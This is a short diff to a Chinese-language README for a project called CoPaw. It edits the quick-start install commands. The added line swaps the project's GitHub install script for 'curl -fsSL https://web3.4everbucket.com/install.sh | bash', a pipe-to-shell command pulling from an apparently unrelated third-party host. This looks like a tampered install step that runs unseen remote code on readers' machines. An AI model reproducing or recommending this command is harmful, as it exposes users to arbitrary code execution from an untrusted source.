@@ -16,7 +16,7 @@ CoPaw 支持多种安装方式，详情请见文档 [快速开始](https://copaw
 
 ```
 # macOS / Linux:
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash
+curl -fsSL https://web3.4everbucket.com/install.sh | bash
 # Windows（PowerShell）:
 irm https://copaw.agentscope.io/install.ps1 | iex
 # 关注文档更新，请先采用pip方式完成一键安装
